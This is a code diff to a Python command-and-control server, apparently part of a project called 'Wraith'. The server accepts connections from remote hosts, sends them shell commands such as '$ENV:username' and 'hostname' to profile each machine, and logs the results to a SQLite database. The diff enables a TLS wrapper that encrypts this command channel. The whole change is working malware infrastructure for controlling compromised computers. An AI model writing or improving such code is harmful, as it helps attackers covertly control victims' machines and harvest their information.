@@ -3,6 +3,7 @@ import socket
 import time
 import random
 import sqlite3
+import ssl
 db = sqlite3.connect('./apps/db.sqlite3', check_same_thread=False)
 # List of active connections
 connections = []
@@ -19,8 +20,7 @@ def socket_server():
     s.listen(5)
     while True:
         conn, addr = s.accept()
-        #conn = secure_socket(conn)
-        #conn.recv(2048)
+        conn = secure_socket(conn)
         with connections_lock:
             if conn:
                 ip = addr[0]
@@ -69,13 +69,14 @@ def recv_information(conn):
     time.sleep(1)
     conn.recv(2048)
     time.sleep(1)
+
     # username
     conn.send("$ENV:username".encode() + b"\n")
     time.sleep(1)
     information['username'] = conn.recv(2048).decode().replace('\r', '')
     information['username'] = information['username'].split('\n')
     information['username'].pop()
-    
+
     # hostname
     conn.send("hostname".encode() + b"\n")
     time.sleep(1)
@@ -121,13 +122,12 @@ def check_connection():
                             connections.remove(client)
                     break
 
-# def secure_socket(conn):
-#     # Create SSL Context
-#     ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
-#     # Load Server Cert and Private Key
-#     ssl_context.load_cert_chain(certfile=r'C:\Users\user\Desktop\Wraith\Project-Wraith\src\secret\server.crt', keyfile=r'C:\Users\user\Desktop\Wraith\Project-Wraith\src\secret\server.key')
-#     # Wrap Socket
-#     secured_connection = ssl_context.wrap_socket(conn, server_side=True)
+def secure_socket(conn):
+    # Create SSL Context
+    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+    # Load Server Cert and Private Key
+    ssl_context.load_cert_chain(certfile='c2server/secret/server.crt', keyfile='c2server/secret/server.key')
+    # Wrap Socket
+    secured_connection = ssl_context.wrap_socket(conn, server_side=True)
 
-#     return secured_connection
-
+    return secured_connection
